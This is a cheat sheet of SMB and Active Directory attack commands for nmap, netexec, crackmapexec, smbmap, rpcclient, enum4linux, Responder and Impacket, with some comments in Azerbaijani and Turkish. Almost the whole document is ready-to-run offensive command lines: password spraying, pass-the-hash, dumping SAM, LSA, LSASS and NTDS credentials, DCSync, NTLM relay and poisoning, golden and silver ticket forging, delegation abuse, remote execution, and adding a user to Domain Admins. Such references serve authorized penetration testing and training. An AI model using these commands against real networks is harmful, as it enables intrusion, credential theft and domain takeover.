# SMB Enumeration and Exploitation Technique

---

# 1. Nmap

## Identify Current Domain Context

```bash
# Basic SMB discovery (ports + services)
nmap -p445 --open -sV -sC $IP

# Full SMB scripting (detailed enum)
nmap -p445 --script=smb* -sV -sC $IP

# Aggressive SMB enum (null sessions + shares)
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-security-mode,smb-os-discovery,smb2-security-mode $IP

# Targeted share enum + vuln check
nmap -p445 --script smb-vuln*,smb-enum* $IP

# SMB protocol & signing check (əlavə edilməli kritik hissə)
nmap -p445 --script smb-protocols,smb2-security-mode $IP

# Time drift (Kerberos üçün vacibdir)
nmap -p445 --script smb2-time $IP

# Multiple targets + output
nmap -iL targets.txt -p445 --script smb* -oA smb_enum
```

# 1.1 Netexec

```bash
netexec smb 10.10.10.5 -u administrator -p Password123
netexec smb 10.10.10.0/24 -u admin -p pass
netexec smb targets.txt -u admin -p pass
netexec smb 10.10.10.0/24 -u users.txt -p Spring2024!
netexec smb 10.10.10.25 -u administrator -H aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58
netexec smb 10.10.10.0/24 -u user -p pass --admin
netexec smb dc_ip -u user -p pass --users
netexec smb dc_ip -u user -p pass --groups
netexec smb 10.10.10.5 -u user -p pass --shares

netexec winrm 10.10.10.25 -u admin -p pass
netexec winrm 10.10.10.25 -u admin -p pass -x "whoami"
netexec winrm 10.129.202.136 -u username.list -p password.list

netexec ldap dc_ip -u user -p pass
netexec ldap dc_ip -u user -p pass --users

netexec mssql 10.10.10.30 -u sa -p Password123
netexec mssql 10.10.10.30 -u sa -p pass -x "whoami"

netexec ssh 10.10.10.20 -u root -p toor

netexec smb --list-modules

netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M ntdsutil
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M sam
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M lsassy
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M system
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M security
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M secretsdump
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M dcsync
```



# 2. Smbclient

```bash
# Basic Syntaxis
smbclient -L //10.10.10.10 -N
smbclient -L //10.10.10.10 -U username
smbclient -L //10.10.10.10 -U username%password
smbclient -L //10.10.10.10 -U domain\\username%password
smbclient -L //10.10.10.10 -W domain -U username
smbclient //10.10.10.10/share -U username
smbclient //10.10.10.10/share -N

# Version Checker
smbclient -L //10.10.10.10 -U user --option='client min protocol=SMB2'
smbclient -L //10.10.10.10 -U user --option='client max protocol=SMB3'
smbclient //10.10.10.10/share -U user --pw-nt-hash HASH

# Kerberos Authentication
kinit username
smbclient -L //dc.domain.local -k

# Commands
| ----- | ------------------------------ |
| `ls`  | List Files                     |
| `dir` | List Files                     |
| `cd`  | Change Directory               |
| `get` | File Download                  |
| `put` | Upload File                    |

| `mget` | Multiple Download              |
| `lcd`  | Change Local Directory         |

# Recursive Download
recurse ON
prompt OFF
mget *
```

# 3. Crackmapexec

```bash
# Host Discovery 
crackmapexec smb 10.10.10.0/24

# Username + Password Test
crackmapexec smb 10.10.10.10 -u user -p password

# Multiple Target 
crackmapexec smb targets.txt -u user -p password

# Spraying
crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt

# Pass The Hash
crackmapexec smb 10.10.10.10 -u administrator -H NTLMHASH

# Domain Authentication
crackmapexec smb 10.10.10.10 -u user -p password -d domain.local

# Local Authentication
crackmapexec smb 10.10.10.10 -u administrator -p password --local-auth

# Check Shares
crackmapexec smb 10.10.10.10 -u user -p password --shares

# Logged-on users (əlavə edilməli)
crackmapexec smb 10.10.10.10 -u user -p password --loggedon-users

# Active sessions (lateral movement üçün vacib)
crackmapexec smb 10.10.10.10 -u user -p password --sessions

# Dump Technique
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u administrator -p password --sam
crackmapexec smb 10.10.10.10 -u administrator -p password --lsa

# Command Execution
crackmapexec smb 10.10.10.10 -u administrator -p password -x "whoami"

# Brute Force
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

```

# 4. Smbmap

```bash
# Basic Enumeration
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u user -p password
smbmap -H 10.10.10.10 -u user -p password -d domain.local

# Pass The Hash
smbmap -H 10.10.10.10 -u administrator -p NTLMHASH

# Recursive File Listing
smbmap -H 10.10.10.10 -u user -p password -r
smbmap -H 10.10.10.10 -u user -p password -r SHARENAME

# Directory Depth List
smbmap -H 10.10.10.10 -u user -p password -r SHARE --depth 2

# File Download
smbmap -H 10.10.10.10 -u user -p password --download SHARE/file.txt

# Upload FIle
smbmap -H 10.10.10.10 -u user -p password --upload local.txt SHARE/local.txt

# Command Execution
smbmap -H 10.10.10.10 -u administrator -p password -x "whoami"

# Check Writable Shares Only
smbmap -H 10.10.10.10 -u user -p password | grep WRITE
```

# 4. RPClient

```bash
# Anonymous bağlanma
rpcclient -U "" 10.10.10.10
rpcclient -U "" 10.10.10.10 --port 10000

# Username + password ilə
rpcclient -U 'username%password' 10.10.10.10

# Domain ilə
rpcclient -U 'domain\\username%password' 10.10.10.10

enumdomusers            # Tüm domain user'ları listele
enumdomgroups           # Tüm domain grupları
queryuser <RID>         # User info (RID=500,501,1000 vs)
querygroup <RID>        # Group info
enumalsgroups domain    # Domain alias grupları
lookupnames <username>  # Username RID bul
lookupsids <SID>        # SID username bul
enumdompolicies         # Domain policy info
getdompwinfo            # Domain password policy (LM/NT hash policy)
querypolicy <policyID>  # Policy detayları
dsroledomains           # Domain roles
enumtrusts              # Trust relationships

enumdomusers 2          # User info + RID
enumdomgroups 2         # Group info + RID
getdompwinfo            # Password policy (kritik!)
queryuser 500           # Administrator info
querygroup 512          # Domain Admins
lookupnames administrator

getusername         # Bağlı user
srvinfo             # Server info
netshareenumall     # Paylaşılan klasörler
enumshares          # Shares
lsaenumsecrets      # LSA secrets (service passwords!)

# Local Enumeration
enumdomusers=0     # Lokal users (domain=0)
enumdomgroups=0    # Lokal groups  
queryuser 500      # Administrator (RID 500)
queryuser 501      # Guest
queryuser 1000     # First user
querygroup 513     # Domain Users (lokal)
querygroup 514     # Domain Guests
lookupnames administrator
lookupnames guest

srvinfo             # Server info (hostname,OS)
netshareenum        # Lokal shares
enumshares          # Paylaşılan klasörler
getusername         # Bağlı username

enumdompolicies=1   # Lokal policies
getdompwinfo        # Lokal password policy
lsaenumaccountspolicy  # Account policy
lsaenumprivs        # Local privileges
lsaqueryinfopol     # LSA policy info

srvinfo
enumdomusers=0 2
enumdomgroups=0 2  
queryuser 500
queryuser 501
getdompwinfo
netshareenum
lsaenumaccountspolicy
```

# 5. Enum4linux

```bash
# Basic enumeration
enum4linux 10.10.10.10

# Anonymous enum
enum4linux -a 10.10.10.10

# With credentials
enum4linux -u username -p password 10.10.10.10

# Users only
enum4linux -U 10.10.10.10

# Groups only
enum4linux -G 10.10.10.10

# Shares only
enum4linux -S 10.10.10.10

# Password policy
enum4linux -P 10.10.10.10

# RID cycling
enum4linux -r 10.10.10.10

# OS information
enum4linux -o 10.10.10.10

# RID Cycling
enum4linux -r 10.10.10.10

# Password Policy Enumeration
enum4linux -P 10.10.10.10

# Share Enumeration
enum4linux -S 10.10.10.10

# Enum4linux-ng
enum4linux-ng -u user -p pass 10.10.10.10
enum4linux-ng 10.10.10.10 -A
```

# 6. Responder

```bash
sudo responder -I eth0

sudo responder -I eth0 -rdw
-r → NetBIOS poisoning
-d → DHCP poisoning
-w → WPAD rogue proxy

# Stealth Mode
sudo responder -I eth0 --disable-ess --disable-http --disable-smb 

# Default Credential File
/usr/share/responder/logs/
```

# 7. İmpacket

```bash
sudo apt install impacket-scripts
pip install impacket

# RPC Recon
rpcdump.py @10.10.10.10

# SID Enumeration
lookupsid.py anonymous@10.10.10.10
lookupsid.py domain/user:password@10.10.10.10

# User Enumeration
samrdump.py 10.10.10.10
samrdump.py domain/user:password@10.10.10.10

# SMB Recon
smbclient.py user:password@10.10.10.10
smbclient.py -no-pass 10.10.10.10
shares

# MSSQL abuse
impacket-mssqlclient domain/user:pass@target
EXEC xp_cmdshell

# Kerberos Recon
GetADUsers.py domain/user:password -dc-ip 10.10.10.10

# AS-REP Roast Recon
GetNPUsers.py domain/ -usersfile users.txt -dc-ip 10.10.10.10

# SPN Enumeration
GetUserSPNs.py domain/user:password -dc-ip 10.10.10.10 -request

# Password Policy Enumeration
GetADUsers.py domain/user:password -dc-ip 10.10.10.10 -all

# Local admin credential
secretsdump.py domain/user:password@10.10.10.10

# Pass-the-Hash
secretsdump.py domain/user@10.10.10.10 -hashes LM:NTLM

# Domain Controller
secretsdump.py domain/user:password@DC-IP -just-dc

# Powershell Exec
psexec.py domain/user:password@10.10.10.10
psexec.py domain/user@10.10.10.10 -hashes LM:NTLM

# WMI Exec
wmiexec.py domain/user:password@10.10.10.10
wmiexec.py domain/user@10.10.10.10 -hashes LM:NTLM

# SMB Exec
smbexec.py domain/user:password@10.10.10.10

# DCSync Attack
secretsdump.py domain/user:password@DC-IP -just-dc-user administrator
secretsdump.py domain/user:password@DC-IP -just-dc
secretsdump.py domain/user:password@DC-IP -just-dc-user krbtgt

# SMB Relay
ntlmrelayx.py -t 10.10.10.10 -smb2support

# Golden Ticket
ticketer.py -nthash KRBTGT_HASH \
-domain domain.local \
-domain-sid S-1-5-21-XXXXX \
-user-id 500 \
-administrator

export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass domain.local/administrator@DC-IP

# Silver Ticket
ticketer.py -nthash SERVICE_HASH \
-domain domain.local \
-domain-sid S-1-5-21-XXXXX \
-spn cifs/target.domain.local \
administrator

# Add Computer Account
addcomputer.py domain/user:password -dc-ip DC-IP

rbcd.py -delegate-from NEWCOMPUTER$ \
-delegate-to TARGETCOMPUTER$ \
-dc-ip DC-IP \
domain/user:password

getST.py -spn cifs/TARGET \
-impersonate administrator \
domain/NEWCOMPUTER$:password

# ACL Abuse

Need Permission for ACL abuse
 GenericAll
net rpc group addmem "Domain Admins" user -U domain/user%password -S DC-IP

 GenericWrite

 WriteDACL
secretsdump.py domain/user:password@DC-IP -just-dc

 WriteOwner
 AllExtendedRights
```





